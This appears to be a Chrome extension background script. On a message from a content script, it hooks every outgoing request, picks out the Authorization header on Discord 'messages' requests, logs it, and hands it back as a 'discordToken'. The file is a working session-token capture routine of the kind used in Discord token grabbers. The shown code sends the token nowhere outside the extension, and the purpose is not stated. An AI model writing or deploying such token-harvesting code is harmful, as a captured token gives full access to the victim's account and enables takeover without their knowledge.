chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  console.log("GOT MESSAGE FROM CONTENT");
  if (request.verify == "true") {
    chrome.webRequest.onBeforeSendHeaders.addListener(
      function (details) {
        for (let x = 0; x < details.requestHeaders.length; x++) {
          if (details.requestHeaders[x].name === "Authorization" && details.url.indexOf("messages") !== -1) {
            // check for url if it contains "messages"
            console.log(details.requestHeaders[x].name + " : " + details.requestHeaders[x].value);
            sendResponse({discordToken: details.requestHeaders[x].value})
          }
        }

        return { requestHeaders: details.requestHeaders };
      },
      { urls: ["<all_urls>"] },
      ["requestHeaders"]
    );
  }
  return true;
});
